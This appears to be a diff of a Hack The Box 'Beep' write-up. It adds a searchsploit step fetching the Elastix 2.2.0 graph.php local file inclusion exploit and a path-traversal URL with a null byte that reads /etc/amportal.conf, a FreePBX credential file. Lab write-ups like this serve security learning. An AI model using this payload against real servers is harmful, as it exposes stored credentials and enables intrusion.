@@ -93,10 +93,21 @@ not recursive
 * Failed to access MySQL Server
 * Not vulnerable to [Webmin Exploit](https://raw.githubusercontent.com/jas502n/CVE-2019-15107/master/CVE_2019_15107.py)
 
-* Successfully exploit LFI vulnerability of elastix
+* LFI vulnerability of elastix
+![image](https://raw.githubusercontent.com/kookiecrack/images/main/elastix-beep.png)
+
+```
+kali@kali:~/HTB/beep$ searchsploit -m php/webapps/37637.pl                             
+  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion             
+      URL: https://www.exploit-db.com/exploits/37637                                                              
+     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
+File Type: ASCII text, with CRLF line terminators                                                                 
+```
+* Use web browser to view files
 ```
 https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
 ```
+
 ```
 # This file is part of FreePBX.
 #
